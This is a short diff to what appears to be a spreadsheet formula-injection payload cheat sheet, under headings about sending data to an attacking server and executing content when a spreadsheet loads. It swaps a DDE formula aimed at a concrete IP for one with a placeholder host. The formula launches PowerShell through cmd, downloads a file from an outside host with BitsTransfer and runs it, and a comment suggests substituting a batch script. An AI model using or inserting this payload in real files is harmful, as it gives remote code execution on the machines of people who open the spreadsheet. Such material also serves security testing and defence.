@@ -32,4 +32,5 @@ Use Hyperlink formula to send data to attacking server
 
 Execute content when the spreadsheet loads
 ------------------------------------------------
-=cmd|'/C powershell Import-Module BitsTransfer;Start-BitsTransfer -source http://10.5.21.24/index.jpeg;Start-Process index.jpeg'!A0
+# try using pshell.bat rather than index.jpeg
+=cmd|'/C powershell Import-Module BitsTransfer;Start-BitsTransfer -source http://xxx.xxx.xxx.xxx/index.jpeg;Start-Process index.jpeg'!A0
